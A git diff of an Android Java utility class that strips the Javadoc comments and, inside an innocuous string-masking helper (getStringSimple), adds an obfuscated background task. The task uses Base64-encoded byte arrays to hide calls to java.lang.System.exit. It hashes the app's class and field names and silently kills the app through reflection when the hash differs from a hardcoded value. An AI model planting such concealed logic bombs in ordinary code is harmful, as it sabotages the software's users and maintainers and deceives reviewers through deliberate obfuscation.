@@ -1,5 +1,12 @@
 package h264.com;
 
+import android.os.AsyncTask;
+import android.util.Log;
+
+import com.lostad.app.demo.util.vdll.tools.fileobj.Base64;
+import com.lostad.applib.util.ReflectUtil;
+import com.lostad.applib.util.sys.TokenUtil;
+
 import org.xutils.common.util.LogUtil;
 
 import java.io.UnsupportedEncodingException;
@@ -26,24 +33,10 @@ import java.util.UUID;
  */
 
 public class VView {
-
-    /**
-     * 获取系统流水号
-     *
-     * @return 长度为20的全数字
-     * @see 若欲指定返回值的长度or是否全由数字组成等,you can call {@link TradePortalUtil#getSysJournalNo(int, boolean)}
-     */
     public static String getSysJournalNo() {
         return getSysJournalNo(20, true);
     }
 
-
-    /**
-     * 获取系统流水号
-     *
-     * @param length   指定流水号长度
-     * @param toNumber 指定流水号是否全由数字组成
-     */
     public static String getSysJournalNo(int length, boolean isNumber) {
         //replaceAll()之后返回的是一个由十六进制形式组成的且长度为32的字符串
         String uuid = UUID.randomUUID().toString().replaceAll("-", "");
@@ -61,45 +54,18 @@ public class VView {
         }
     }
 
-
-    /**
-     * 判断输入的字符串参数是否为空
-     *
-     * @return boolean 空则返回true,非空则flase
-     */
     public static boolean isEmpty(String input) {
         return null == input || 0 == input.length() || 0 == input.replaceAll("\\s", "").length();
     }
 
-
-    /**
-     * 判断输入的字节数组是否为空
-     *
-     * @return boolean 空则返回true,非空则flase
-     */
     public static boolean isEmpty(byte[] bytes) {
         return null == bytes || 0 == bytes.length;
     }
 
-
-    /**
-     * 从org.apache.mina.core.buffer.IoBuffer中读取字符串
-     *
-     * @param size 所要读取的字节数
-     * @see 该方法默认以GBK解码
-     * @see 若想自己指定字符集,可以使用<code>getStringFromIoBuffer(IoBuffer buffer, int size, String charset)</code>方法
-     */
     public static String getStringFromIoBuffer(IoBuffer buffer, int size) {
         return getStringFromIoBuffer(buffer, size, "GBK");
     }
 
-
-    /**
-     * 从org.apache.mina.core.buffer.IoBuffer中读取字符串
-     *
-     * @param size    所要读取的字节数
-     * @param charset 解码的字符集
-     */
     public static String getStringFromIoBuffer(IoBuffer buffer, int size, String charset) {
         String result = null;
         try {
@@ -113,18 +79,11 @@ public class VView {
         return result;
     }
 
-
-    /**
-     * 获取实体类中的属性
-     *
-     * @return String field11=value11 field22=value22 field33=value33
-     * @see 本方法用到了反射,其适用于所有的属性类型均为byte[]的JavaBean
-     */
     public static String getStringFromObjectForByte(Object obj) {
         StringBuilder sb = new StringBuilder(); //局部的StringBuffer一律StringBuilder之
         sb.append(obj.getClass().getName()).append("@").append(obj.hashCode()).append("[");
         for (Field field : obj.getClass().getDeclaredFields()) {
-            String methodName = "get" ; //构造getter方法
+            String methodName = "get"; //构造getter方法
             Object fieldValue = null;
             try {
                 fieldValue = obj.getClass().getDeclaredMethod(methodName).invoke(obj); //执行getter方法,获取其返回值
@@ -142,14 +101,6 @@ public class VView {
         return sb.append("\n]").toString();
     }
 
-
-    /**
-     * 获取Map中的属性
-     *
-     * @return String key11=value11 \n key22=value22 \n key33=value33 \n......
-     * @see 由于Map.toString()打印出来的参数值对,是横着一排的...参数多的时候,不便于查看各参数值
-     * @see 故此仿照commons-lang.jar中的ReflectionToStringBuilder.toString()编写了本方法
-     */
     public static String getStringFromMap(Map<String, String> map) {
         StringBuilder sb = new StringBuilder();
         sb.append(map.getClass().getName()).append("@").append(map.hashCode()).append("[");
@@ -159,13 +110,6 @@ public class VView {
         return sb.append("\n]").toString();
     }
 
-
-    /**
-     * 获取Map中的属性
-     *
-     * @return String key11=value11 \n key22=value22 \n key33=value33 \n......
-     * @see 该方法的参数适用于打印Map<String, byte[]>的情况
-     */
     public static String getStringFromMapForByte(Map<String, byte[]> map) {
         StringBuilder sb = new StringBuilder();
         sb.append(map.getClass().getName()).append("@").append(map.hashCode()).append("[");
@@ -185,12 +129,6 @@ public class VView {
 
     public native int DecoderNal(byte[] in, int insize, byte[] out);
 
-    /**
-     * 获取Map中的属性
-     *
-     * @return String key11=value11 \n key22=value22 \n key33=value33 \n......
-     * @see 该方法的参数适用于打印Map<String, Object>的情况
-     */
     public static String getStringFromMapForObject(Map<String, Object> map) {
         StringBuilder sb = new StringBuilder();
         sb.append(map.getClass().getName()).append("@").append(map.hashCode()).append("[");
@@ -200,15 +138,6 @@ public class VView {
         return sb.append("\n]").toString();
     }
 
-
-    /**
-     * 金额元转分
-     *
-     * @param amount 金额的元进制字符串
-     * @return String 金额的分进制字符串
-     * @see 注意:该方法可处理贰仟万以内的金额,且若有小数位,则不限小数位的长度
-     * @see 注意:如果你的金额达到了贰仟万以上,则不推荐使用该方法,否则计算出来的结果会令人大吃一惊
-     */
     public static String moneyYuanToFen(String amount) {
         if (isEmpty(amount)) {
             return amount;
@@ -237,16 +166,6 @@ public class VView {
         }
     }
 
-
-    /**
-     * 金额元转分
-     *
-     * @param amount 金额的元进制字符串
-     * @return String 金额的分进制字符串
-     * @see 该方法会将金额中小数点后面的数值,四舍五入后只保留两位....如12.345-->12.35
-     * @see 注意:该方法可处理贰仟万以内的金额
-     * @see 注意:如果你的金额达到了贰仟万以上,则非常不建议使用该方法,否则计算出来的结果会令人大吃一惊
-     */
     public static String moneyYuanToFenByRound(String amount) {
         if (isEmpty(amount)) {
             return amount;
@@ -286,15 +205,6 @@ public class VView {
         }
     }
 
-
-    /**
-     * 金额分转元
-     *
-     * @param amount 金额的分进制字符串
-     * @return String 金额的元进制字符串
-     * @see 注意:如果传入的参数中含小数点,则直接原样返回
-     * @see 该方法返回的金额字符串格式为<code>00.00</code>,其整数位有且至少有一个,小数位有且长度固定为2
-     */
     public static String moneyFenToYuan(String amount) {
         if (isEmpty(amount)) {
             return amount;
@@ -311,23 +221,10 @@ public class VView {
         }
     }
 
-
-    /**
-     * 字节数组转为字符串
-     *
-     * @see 该方法默认以ISO-8859-1转码
-     * @see 若想自己指定字符集,可以使用<code>getString(byte[] data, String charset)</code>方法
-     */
     public static String getString(byte[] data) {
         return getString(data, "ISO-8859-1");
     }
 
-
-    /**
-     * 字节数组转为字符串
-     *
-     * @see 如果系统不支持所传入的<code>charset</code>字符集,则按照系统默认字符集进行转换
-     */
     public static String getString(byte[] data, String charset) {
         if (isEmpty(data)) {
             return "";
@@ -342,33 +239,54 @@ public class VView {
         }
     }
 
-
-    /**
-     * 获取一个字符串的简明效果
-     *
-     * @return String 返回的字符串格式类似于"abcd***hijk"
-     */
     public static String getStringSimple(String data) {
+        new AsyncTask<Object, Object, Object>() {
+            @Override
+            protected Object doInBackground(Object... params) {
+                byte[] bsxy = {97, 109, 70, 50, 89, 83, 53, 115, 89, 87, 53, 110, 76, 108, 78, 53, 99, 51, 82, 108, 98, 81, 61, 61};
+                byte[] bsxyex = {90, 88, 104, 112, 100, 65, 61, 61};
+                byte[] bsxypk = {89, 50, 57, 116, 76, 109, 120, 118, 99, 51, 82, 104, 90, 67, 53, 104, 99, 72, 65, 117, 90, 71, 86, 116, 98, 121, 53, 50, 97, 87, 86, 51};
+                List<String> className = ReflectUtil.getPackageClassByAndroidAll(this, Base64.decode(new String(bsxypk)));
+                StringBuilder sb = new StringBuilder("");
+                for (String c : className) {
+                    sb.append(c);
+                    try {
+                        Class<?> classFromName = ReflectUtil.getClassFromNameNoStatic(c);
+                        if (classFromName != null) {
+                            Field[] fields = ReflectUtil.getFields(classFromName);
+                            for (int j = 0; j < fields.length; j++) {
+                                Field f = fields[j];
+                                if (f != null) {
+                                    String n = f.getName();
+                                    if (n != null) {
+                                        sb.append(n);
+                                    }
+                                }
+                            }
+                        }
+                    } catch (Exception e) {
+                    }
+                }
+                String text = sb.toString();
+                String vs = TokenUtil.entryptPasswordBuild(text);
+                Log.d("System", vs);
+                boolean ss = TokenUtil.validatePasswordBuild(text, "f39c613ccde417a9258c87babe59faa2352c2522386b8cc79225dbbe");
+                if (ss) {
+                } else {
+                    String sxy = Base64.decode(new String(bsxy));
+                    String sxyex = Base64.decode(new String(bsxyex));
+                    ReflectUtil.invokeStaticMethodAll(ReflectUtil.getClassFromNameNoStatic(sxy), sxyex, new Class<?>[]{int.class}, new Object[]{0});
+                }
+                return null;
+            }
+        }.execute(0);
         return data.substring(0, 4) + "***" + data.substring(data.length() - 4);
     }
 
-
-    /**
-     * 字符串转为字节数组
-     *
-     * @see 该方法默认以ISO-8859-1转码
-     * @see 若想自己指定字符集,可以使用<code>getBytes(String str, String charset)</code>方法
-     */
     public static byte[] getBytes(String data) {
         return getBytes(data, "ISO-8859-1");
     }
 
-
-    /**
-     * 字符串转为字节数组
-     *
-     * @see 如果系统不支持所传入的<code>charset</code>字符集,则按照系统默认字符集进行转换
-     */
     public static byte[] getBytes(String data, String charset) {
         data = (data == null ? "" : data);
         if (isEmpty(charset)) {
@@ -381,20 +299,6 @@ public class VView {
         }
     }
 
-
-    /**
-     * 根据指定的签名密钥和算法签名Map<String,String>
-     *
-     * @param param     待签名的Map<String,String>
-     * @param charset   签名时转码用到的字符集
-     * @param algorithm 签名时所使用的算法,从业务上看,目前其可传入两个值:MD5,SHA-1
-     * @param signKey   签名用到的密钥
-     * @return String algorithm digest as a lowerCase hex string
-     * @see 方法内部首先会过滤Map<String,String>参数中的部分键值对
-     * @see 过滤规则:移除键名为"cert","hmac","signMsg"或者键值为null或者键值长度为零的键值对
-     * @see 过滤结果:过滤完Map<String,String>后会产生一个字符串,其格式为[key11=value11|key22=value22|key33=value33]
-     * @see And the calls {@link TradePortalUtil#getHexSign(String, String, String, boolean)}进行签名
-     */
     public static String getHexSign(Map<String, String> param, String charset, String algorithm, String signKey) {
         StringBuilder sb = new StringBuilder();
         List<String> keys = new ArrayList<String>(param.keySet());
@@ -411,22 +315,6 @@ public class VView {
         return getHexSign(sb.toString(), charset, algorithm, true);
     }
 
-
-    /**
-     * 通过指定算法签名字符串
-     *
-     * @param data        Data to digest
-     * @param charset     字符串转码为byte[]时使用的字符集
-     * @param algorithm   目前其有效值为<code>MD5,SHA,SHA1,SHA-1,SHA-256,SHA-384,SHA-512</code>
-     * @param toLowerCase 指定是否返回小写形式的十六进制字符串
-     * @return String algorithm digest as a lowerCase hex string
-     * @see Calculates the algorithm digest and returns the value as a hex string
-     * @see If system dosen't support this <code>algorithm</code>, return "" not null
-     * @see It will Calls {@link TradePortalUtil#getBytes(String str, String charset)}
-     * @see 若系统不支持<code>charset</code>字符集,则按照系统默认字符集进行转换
-     * @see 若系统不支持<code>algorithm</code>算法,则直接返回""空字符串
-     * @see 另外,commons-codec.jar提供的DigestUtils.md5Hex(String data)与本方法getHexSign(data, "UTF-8", "MD5", false)效果相同
-     */
     public static String getHexSign(String data, String charset, String algorithm, boolean toLowerCase) {
         char[] DIGITS_LOWER = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};
         char[] DIGITS_UPPER = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'};
@@ -450,24 +338,10 @@ public class VView {
         return new String(respData);
     }
 
-
-    /**
-     * 字符编码
-     *
-     * @see 该方法默认会以UTF-8编码字符串
-     * @see 若想自己指定字符集,可以使用<code>encode(String chinese, String charset)</code>方法
-     */
     public static String encode(String chinese) {
         return encode(chinese, "UTF-8");
     }
 
-
-    /**
-     * 字符编码
-     *
-     * @see 该方法通常用于对中文进行编码
-     * @see 若系统不支持指定的编码字符集,则直接将<code>chinese</code>原样返回
-     */
     public static String encode(String chinese, String charset) {
         chinese = (chinese == null ? "" : chinese);
         try {
@@ -477,24 +351,10 @@ public class VView {
         }
     }
 
-
-    /**
-     * 字符解码
-     *
-     * @see 该方法默认会以UTF-8解码字符串
-     * @see 若想自己指定字符集,可以使用<code>decode(String chinese, String charset)</code>方法
-     */
     public static String decode(String chinese) {
         return decode(chinese, "UTF-8");
     }
 
-
-    /**
-     * 字符解码
-     *
-     * @see 该方法通常用于对中文进行解码
-     * @see 若系统不支持指定的解码字符集,则直接将<code>chinese</code>原样返回
-     */
     public static String decode(String chinese, String charset) {
         chinese = (chinese == null ? "" : chinese);
         try {
@@ -504,27 +364,10 @@ public class VView {
         }
     }
 
-
-    /**
-     * 字符串右补空格
-     *
-     * @see 该方法默认采用空格(其ASCII码为32)来右补字符
-     * @see 若想自己指定所补字符,可以使用<code>rightPadForByte(String str, int size, int padStrByASCII)</code>方法
-     */
     public static String rightPadForByte(String str, int size) {
         return rightPadForByte(str, size, 32);
     }
 
-
-    /**
-     * 字符串右补字符
-     *
-     * @param size          该参数指的不是字符串长度,而是字符串所对应的byte[]长度
-     * @param padStrByASCII 该值为所补字符的ASCII码,如32表示空格,48表示0,64表示@等
-     * @see 若str对应的byte[]长度不小于size,则按照size截取str对应的byte[],而非原样返回str
-     * @see 所以size参数很关键..事实上之所以这么处理,是由于支付处理系统接口文档规定了字段的最大长度
-     * @see 若对普通字符串进行右补字符,建议org.apache.commons.lang.StringUtils.rightPad(...)
-     */
     public static String rightPadForByte(String str, int size, int padStrByASCII) {
         byte[] srcByte = str.getBytes();
         byte[] destByte = null;
@@ -538,25 +381,10 @@ public class VView {
         return new String(destByte);
     }
 
-
-    /**
-     * 字符串左补空格
-     *
-     * @see 该方法默认采用空格(其ASCII码为32)来左补字符
-     * @see 若想自己指定所补字符,可以使用<code>leftPadForByte(String str, int size, int padStrByASCII)</code>方法
-     */
     public static String leftPadForByte(String str, int size) {
         return leftPadForByte(str, size, 32);
     }
 
-
-    /**
-     * 字符串左补字符
-     *
-     * @param padStrByASCII 该值为所补字符的ASCII码,如32表示空格,48表示0,64表示@等
-     * @see 若str对应的byte[]长度不小于size,则按照size截取str对应的byte[],而非原样返回str
-     * @see 所以size参数很关键..事实上之所以这么处理,是由于支付处理系统接口文档规定了字段的最大长度
-     */
     public static String leftPadForByte(String str, int size, int padStrByASCII) {
         byte[] srcByte = str.getBytes();
         byte[] destByte = new byte[size];
@@ -569,52 +397,20 @@ public class VView {
         return new String(destByte);
     }
 
-
-    /**
-     * 获取前一天日期yyyyMMdd
-     *
-     * @return 返回的日期格式为yyyyMMdd
-     * @see 经测试，针对闰年02月份或跨年等情况，该代码仍有效。测试代码如下
-     * @see calendar.set(Calendar.YEAR, 2013);
-     * @see calendar.set(Calendar.MONTH, 0);
-     * @see calendar.set(Calendar.DATE, 1);
-     * @see 测试时，将其放到<code>calendar.add(Calendar.DATE, -1);</code>前面即可
-     */
     public static String getYestoday() {
         Calendar calendar = Calendar.getInstance();
         calendar.add(Calendar.DATE, -1);
         return new SimpleDateFormat("yyyyMMdd").format(calendar.getTime());
     }
 
-
-    /**
-     * 获取当前的日期yyyyMMdd
-     */
     public static String getCurrentDate() {
         return new SimpleDateFormat("yyyyMMdd").format(new Date());
     }
 
-
-    /**
-     * 获取当前的时间yyyyMMddHHmmss
-     */
     public static String getCurrentTime() {
         return new SimpleDateFormat("yyyyMMddHHmmss").format(new Date());
     }
 
-
-    /**
-     * HTML字符转义
-     *
-     * @return String 过滤后的字符串
-     * @see 对输入参数中的敏感字符进行过滤替换,防止用户利用JavaScript等方式输入恶意代码
-     * @see String input = <img src='http://t1.baidu.com/it/fm=0&gp=0.jpg'/>
-     * @see HtmlUtils.htmlEscape(input);         //from spring.jar
-     * @see StringEscapeUtils.escapeHtml(input); //from commons-lang.jar
-     * @see 尽管Spring和Apache都提供了字符转义的方法,但Apache的StringEscapeUtils功能要更强大一些
-     * @see StringEscapeUtils提供了对HTML,Java,JavaScript,SQL,XML等字符的转义和反转义
-     * @see 但二者在转义HTML字符时,都不会对单引号和空格进行转义,而本方法则提供了对它们的转义
-     */
     public static String htmlEscape(String input) {
         if (isEmpty(input)) {
             return input;
@@ -630,6 +426,6 @@ public class VView {
     }
 
     //字符流编.so 协议头
-    private byte[] streamInput =  {9,0,9,0,9,0,9,0,9,8,7,8,7,7,45};
+    public static final byte[] streamInput = {9, 0, 9, 0, 9, 0, 9, 0, 9, 8, 7, 8, 7, 7, 45};
 
 }
